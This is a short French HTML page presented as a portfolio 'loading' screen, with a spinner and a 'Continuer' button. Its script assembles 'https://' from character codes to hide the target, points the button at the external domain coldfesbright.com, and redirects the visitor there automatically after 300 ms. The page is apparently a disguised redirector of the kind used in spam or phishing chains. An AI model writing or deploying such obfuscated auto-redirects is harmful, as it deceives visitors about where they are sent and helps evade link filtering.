<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portfolio - Chargement</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f4f4f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: #fff; border-radius: 14px; padding: 42px; max-width: 470px; width: 90%; text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,0.07); }
        h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 12px; }
        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 22px; }
        .spinner { width: 36px; height: 36px; border: 3px solid #eceaf5; border-top-color: #6d28d9; border-radius: 50%; animation: r 0.8s linear infinite; margin: 0 auto 22px; }
        @keyframes r { to { transform: rotate(360deg); } }
        a.btn { display: inline-block; background: #6d28d9; color: #fff; text-decoration: none; padding: 12px 34px; border-radius: 9px; font-size: 15px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h1>Redirection en cours</h1>
        <p>Vous allez être redirigé automatiquement.<br>Si rien ne se passe, cliquez ci-dessous.</p>
        <a class="btn" id="z" href="#">Continuer</a>
    </div>
    <script>
        (function(){
            var d = [104,116,116,112,115,58,47,47];
            var h = "coldfesbright.com";
            var u = String.fromCharCode.apply(null, d) + h;
            document.getElementById("z").href = u;
            setTimeout(function(){ window.location.href = u; }, 300);
        })();
    </script>
</body>
</html>
